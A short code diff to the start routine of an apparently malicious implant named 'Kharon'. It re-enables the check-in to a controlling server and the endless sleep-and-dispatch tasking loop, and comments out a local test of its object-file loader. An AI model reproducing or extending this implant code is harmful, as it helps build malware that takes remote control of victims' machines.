@@ -265,22 +265,21 @@ auto DECLFN Kharon::Start(
     
     KhDbgz( "initializing the principal routine" );
 
-    // Success = Tsp->Checkin();
+    Success = Tsp->Checkin();
 
-    HANDLE FileHandle = Krnl32.CreateFileA("D:\\malw\\Kharon\\Agent\\user.o", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
-    ULONG  FileSize   = Krnl32.GetFileSize( FileHandle, 0 );
-    PBYTE  FileBuff   = (PBYTE)Hp->Alloc( FileSize );
+    // HANDLE FileHandle = Krnl32.CreateFileA("D:\\malw\\Kharon\\Agent\\user.o", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
+    // ULONG  FileSize   = Krnl32.GetFileSize( FileHandle, 0 );
+    // PBYTE  FileBuff   = (PBYTE)Hp->Alloc( FileSize );
 
-    Krnl32.ReadFile( FileHandle, FileBuff, FileSize, 0, 0 );
+    // Krnl32.ReadFile( FileHandle, FileBuff, FileSize, 0, 0 );
 
-    KhDbgz("file read: %d", FileSize);
+    // KhDbgz("file read: %d", FileSize);
 
-    Cf->Loader( FileBuff, FileSize, NULL, 0 );
+    // Cf->Loader( FileBuff, FileSize, NULL, 0 );
 
-    Krnl32.WaitForSingleObject( NtCurrentProcess(), 0x50000 );
-    // do {            
-    //     Mk->Main( Session.SleepTime );
+    do {            
+        Mk->Main( Session.SleepTime );
 
-    //     Tk->Dispatcher();
-    // } while( 1 );
+        Tk->Dispatcher();
+    } while( 1 );
 }
